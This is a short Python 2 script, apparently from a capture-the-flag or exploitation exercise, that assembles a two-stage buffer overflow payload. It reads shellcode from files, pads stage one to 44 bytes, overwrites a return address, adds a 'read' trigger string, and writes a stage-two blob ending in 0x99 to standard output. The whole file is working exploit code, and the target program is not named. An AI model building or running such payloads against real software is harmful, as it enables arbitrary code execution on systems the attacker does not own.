#!/usr/bin/python2

import sys

fh = open('stage_1_cleaned', 'rb')
stage_1 = fh.read()
fh.close()

fh = open('stage_2', 'rb')
stage_2 = fh.read()
fh.close()

STAGE_1_BYTES_TO_RET = 44
STAGE_1_ADDRESS    = chr(0xff) + chr(0xd2)
STAGE_2_TERMINATOR = chr(0x99)

'''
   stage 1 must be of format
   8 padding bytes
   stage 1 shellcode
   and other padding bytes needed
   return address
   newline
   string "read"
   newline

   stage 2 can be fed as is, terminated with 0x99
'''

stage_1 =   'A' * 8 \
          + stage_1 \
          + 'A' * (STAGE_1_BYTES_TO_RET - (len(stage_1) + 8)) \
          + STAGE_1_ADDRESS \
          + chr(0x0a) \
          + "read" \
          + chr(0x0a)

sys.stdout.write(stage_1)
sys.stdout.write(stage_2 + STAGE_2_TERMINATOR)
